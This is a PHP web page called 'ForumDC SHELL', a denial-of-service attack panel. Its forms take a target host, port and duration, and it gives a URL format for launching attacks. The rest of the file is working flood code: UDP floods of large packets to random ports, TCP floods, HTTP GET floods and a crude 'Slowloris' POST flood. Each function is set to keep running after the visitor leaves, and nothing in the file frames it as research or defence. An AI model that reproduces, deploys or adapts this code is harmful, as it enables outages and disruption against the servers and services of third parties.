<?php
 
 
 
 
        $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
    $myna = $_SERVER[PHP_SELF];
 
 
 ?>
 
 
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Attack for all xD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
 
    <!-- Le styles -->
    <link href="http://getbootstrap.com/2.3.2/assets/css/bootstrap.css" rel="stylesheet">
    <link href="http://getbootstrap.com/2.3.2/assets/css/bootstrap-responsive.css" rel="stylesheet">
    <link href="http://getbootstrap.com/2.3.2/assets/css/docs.css" rel="stylesheet">
    <link href="http://getbootstrap.com/2.3.2/assets/js/google-code-prettify/prettify.css" rel="stylesheet">
<center>
    <b style="font-size:44px;"><font color="#009300">Forum</font><font color="#ff0000">DC</font> SHELL</b>
<br><br>
</center>
<div class="well">
<center>
    <?php if(empty($_GET['type'])) { ?><br>SEND ATTACK DDOS<br><br>
<form action="" method="get">
<input type="text" name="host" placeholder="HOST"><br>
<input type="text" name="port" placeholder="PORT"><br>
<input type="text" name="time" placeholder="TIME"><br>
<select name="type">
    <optgroup label="Methodes 1">
    <option value="UDP">UDP</option>
    <option value="TCP">TCP</option>
    <option value="HTTP">HTTP</option>
    <option value="SLOWLORIS">SLOWLORIS</option>
</opt>
 
    <optgroup label="Methodes 2">
    <option value="UDP">HOME CONNECTION</option>
    <option value="TCP">SSYN</option>
    <option value="HTTP">WEBSITE CRASH</option>
    <option value="SLOWLORIS">WEBSITE CRASH SLOW</option>
</opt>
</select><br>
<input type="submit" class="btn" value="START ATTACK!">
</form>
 
<form action="" method="get">
    <input type="submit" name="" class="btn" value="STOP CURRENT ATTACK!">
</form>
<small>API FORMAT: index.php?host=[host]&port=[port]&time=[time]&type=[method (UDP/TCP/HTTP/SLOWLORIS)]</small>
<?php } ?>
 
 <?php
    $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
    $myna = $_SERVER[PHP_SELF];
 
        if ( isset( $_GET['type'] ) )
                {
                       $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
    $myna = $_SERVER[PHP_SELF];
 
                if ( $type == "UDP" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' )
                                {
                                $page .= UDP_FLOOD( $host , $time );
                                }
                        else
                                {
                                $page .= '              <b>UDP Flood</b><br /><br />' . "\n";
                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" 

name="host" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" 

name="time"></td></tr>' . "\n";
                                $page .= '                      </table>' . "\n";
                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Flood!" />' . 

"\n";
                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . 

"\n";
                                $page .= '              </form>' . "\n";
                                }
                        }
                elseif ( $type == "TCP" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['port'] != '' )
                                {
                                $page .= TCP_FLOOD ( $host , $port , $time );
                                }
                        else
                                {
                                $page .= '              <b>TCP Flood</b><br /><br />' . "\n";
                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";;
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" 

name="host" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Port:</td><td><input type="text" style="width: 130px" 

name="port" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" 

name="time"></td></tr>' . "\n";
                                $page .= '                      </table>' . "\n";
                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Flood!" />' . 

"\n";
                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . 

"\n";
                                $page .= '              </form>' . "\n";
                                }
                        }
                elseif ( $type == "HTTP" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['page'] != '' )
                                {
                                $page .= HTTP_FLOOD ( $host , $page , $time );
                                }
                        else
                                {
                                $page .= '              <b>HTTP Flood</b><br /><br />' . "\n";
                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";;
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" 

name="host" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Page:</td><td><input type="text" style="width: 130px" 

name="page" value="/"></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" 

name="time"></td></tr>' . "\n";
                                $page .= '                      </table>' . "\n";
                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Flood!" />' . 

"\n";
                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . 

"\n";
                                $page .= '              </form>' . "\n";
                                }
                        }
                elseif ( $type == "SLOWLORIS" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['page'] != '' )
                                {
                                $page .= SLOWLORIS ( $host , $page , $time );
                                }
                        else
                                {
                                $page .= '              <b>Slowloris</b><br /><br />' . "\n";
                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";;
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" 

name="host" ></td></tr>' . "\n";
                                $page .= '                      <tr><td>Page:</td><td><input type="text" style="width: 130px" 

name="page" value="/"></td></tr>' . "\n";
                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" 

name="time"></td></tr>' . "\n";
                                $page .= '                      </table>' . "\n";
                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Flood!" />' . 

"\n";
                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . 

"\n";
                                $page .= '              </form>' . "\n";
                                }
                        }
                else
                        {
                     
                        }
                }
        else
                {
             
                }
 
        $page .= '              <br /></div>' . "\n";
        $page .= '      </body>' . "\n";
        $page .= '</html>' . "\n";
 
        print$page;
 
/////////////////////////////////////////////////////////////////////////////////////////////////////////
// UDP FLOOD ////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////
 
        function UDP_Flood( $host , $length )
                {
                ignore_user_abort(TRUE);
                set_time_limit(0);
 
                $max_time = time() + $length;
 
                $packet = "";
                $packets = 0;
 
                while( strlen ( $packet ) < 65000 )
                        {
                        $packet .= Chr( 255 );
                        }
 
                while( 1 )
                        {
                        if ( time() > $max_time )
                                {
                                break;
                                }
 
                        $rand = rand( 1 , 65535 );
                        @$fp = fsockopen( 'udp://'.$host, $rand, $errno, $errstr, 5 );
                        if( $fp )
                                {
                                fwrite( $fp , $packet );
                                fclose( $fp );
                                $packets++;
                                }
                        }
 
                if ( $packets == 0 )
                        {
                        $rtn  = '<b>UDP Flood</b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
                        $rtn .= '<br /><b>An error occurred! Could not send packets.</b><br />' . "\n";
                        }
                else
                        {
                        $rtn  = '<b>UDP Flood</b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Packets:</b></td><td>' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s 

)</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Megabytes:</b></td><td>' . round(($packets*65)/1024) . ' ( ' . round

((($packets*65)/1024)/$length) . ' MB/s )</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
                        }
 
                return$rtn;
                }
 
/////////////////////////////////////////////////////////////////////////////////////////////////////////
// TCP FLOOD ////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////
 
        function TCP_Flood( $host , $port , $length )
                {
                ignore_user_abort(TRUE);
                set_time_limit(0);
 
                $max_time = time() + $length;
 
                $packet = "";
                $packets = 0;
 
                while( strlen ( $packet ) < 65000 )
                        {
                        $packet .= Chr( 255 );
                        }
 
                @$fp = fsockopen( 'tcp://'.$host, $port, $errno, $errstr, 5 );
 
                while( 1 )
                        {
                        if ( time() > $max_time )
                                {
                                break;
                                }
 
                        if( $fp )
                                {
                                fwrite( $fp , $packet );
                                fclose( $fp );
                                $packets++;
                                }
                        else
                                {
                                @$fp = fsockopen( 'tcp://'.$host, $port, $errno, $errstr, 5 );
                                }
                        }
 
                if ( $packets == 0 )
                        {
                        $rtn  = '<b>TCP Flood</b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Port:</b></td><td>' . $port . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
                        $rtn .= '<br /><b>An error occurred! Could not send packets.</b><br />' . "\n";
                        }
                else
                        {
                        $rtn  = '<b>TCP Flood</b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Port:</b></td><td>' . $port . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Packets:</b></td><td>' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s 

)</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Megabytes:</b></td><td>' . round(($packets*65)/1024) . ' ( ' . round

((($packets*65)/1024)/$length) . ' MB/s )</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
                        }
 
                return$rtn;
                }
 
/////////////////////////////////////////////////////////////////////////////////////////////////////////
// HTTP FLOOD ///////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////
 
        function HTTP_Flood( $host , $page , $length )
                {
                ignore_user_abort(TRUE);
                set_time_limit(0);
 
                if ( $page == '' )
                        {
                        $page = '/';
                        }
 
                $max_time = time() + $length;
 
                $packet .= 'GET ' . $page . ' HTTP/1.1' . "\r\n";
                $packet .= 'Host: ' . $host . "\r\n";
                $packet .= 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:2.0b7) Gecko/20100101 Firefox/4.0b7' . "\r\n";
                $packet .= 'Keep-alive: 300' . "\r\n";
                $packet .= 'Connection: keep-alive' . "\r\n\r\n";
 
                @$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
                while( 1 )
                        {
                        if ( time() > $max_time )
                                {
                                break;
                                }
 
                        if( $fp )
                                {
                                fwrite( $fp , $packet );
                                fclose( $fp );
                                $packets++;
                                }
                        else
                                {
                                @$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
                                }
                        }
 
                if ( $packets == 0 )
                        {
                        $rtn  = '<b>HTTP Flood</b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
                        $rtn .= '<br /><b>An error occurred! Could not send packets.</b><br />' . "\n";
                        }
                else
                        {
                        $rtn  = '<b>HTTP Flood</b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '<b>Packets:</b> ' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s ) <br />' . 

"\n";
                        $rtn .= '</table>' . "\n";
                        }
 
                return$rtn;
                }
 
/////////////////////////////////////////////////////////////////////////////////////////////////////////
// SLOWLORIS ///////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////
 
        function SLOWLORIS( $host , $page , $length )
                {
                ignore_user_abort(TRUE);
                set_time_limit(0);
 
                if ( $page == '' )
                        {
                        $page = '/';
                        }
 
                $max_time = time() + $length;
 
                $packet .= 'POST ' . $page . ' HTTP/1.1' . "\r\n";
                $packet .= 'Host: ' . $host . "\r\n";
                $packet .= 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:2.0b7) Gecko/20100101 Firefox/4.0b7' . "\r\n";
                $packet .= 'Content-length: 42' . "\r\n\r\n";
 
                @$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
                while( 1 )
                        {
                        if ( time() > $max_time )
                                {
                                break;
                                }
 
                        if( $fp )
                                {
                                fwrite( $fp , $packet );
                                fclose( $fp );
                                $packets++;
                                }
                        else
                                {
                                @$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
                                }
                        }
 
                if ( $packets == 0 )
                        {
                        $rtn  = '<b>Slowloris</b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
                        $rtn .= '<br /><b>An error occurred! Could not send packets.</b><br />' . "\n";
                        }
                else
                        {
                        $rtn  = '<b>Slowloris</b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '<b>Packets:</b> ' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s ) <br />' . 

"\n";
                        $rtn .= '</table>' . "\n";
                        }
 
                return$rtn;
                }
           
?>
 
</center>
</div> 
